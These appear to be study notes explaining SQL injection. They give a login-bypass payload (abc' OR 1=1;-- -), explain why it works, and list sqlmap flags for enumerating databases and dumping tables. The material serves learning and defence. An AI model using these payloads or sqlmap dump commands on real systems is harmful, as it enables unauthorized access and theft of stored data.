**==`Normal USER :`==**

Let’s take an example of a login page that asks you to enter your username and password to log in. Let’s provide it with the following data:

`Username: John`

`Password: Un@detectable444`

Once you enter your username and password, the website will receive it, make an SQL query with your credentials, and send it to the database. 

```php
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

**==`Attacker :`==**

`Username: John`

`Password: abc' OR 1=1;-- -`

This time, the attacker typed a random string `abc` and an injected string `' OR 1=1;-- -`. The SQL query that the website would send to the database will now become the following:

```php
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

---
### Why this works

In SQL, **operator precedence matters**:  `AND` is evaluated **before** `OR`
  
So the query is interpreted as:

```sql
(username = 'John' AND password = 'abc') OR 1=1
```

Now evaluate it:

```sql
username = 'John' AND password = 'abc' → false (password is wrong)
OR 1=1 → true
```

Since **one side of the OR is true**, the entire `WHERE` clause becomes true.

👉 Result: **the query returns rows**, and the application thinks authentication succeeded.

### Why the single quote `'` is crucial

Without the quote, SQL would treat the entire string as the password value, which would **not break out of the string literal**, and the attack would fail.

```sql
abc OR 1=1;-- -
```

With the quote:

```sql
'abc' OR 1=1 -- -
```

The attacker:

1. Properly closes the password string
2. Injects a new logical condition
3. Comments out the trailing `'` added by the application

That’s what makes the injection syntactically valid.

---
#### ==`Automated SQL Injection`==

SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities.

==`sqlmap --wizard`==

![[Pasted image 20260123225041.png]]

### SQLMap Commands (Organized)

**Target**

- `-u` → Specify target URL (GET-based testing)




**Session Handling**

- `--cookie` → Use authenticated session cookies


**Database Enumeration**

- `--dbs` → List database names

- `-D <db> --tables` → List tables in a database

- `-D <db> -T <table> --columns` → List columns in a table




**Data Extraction**

- `-D <db> -T <table> --dump` → Dump table records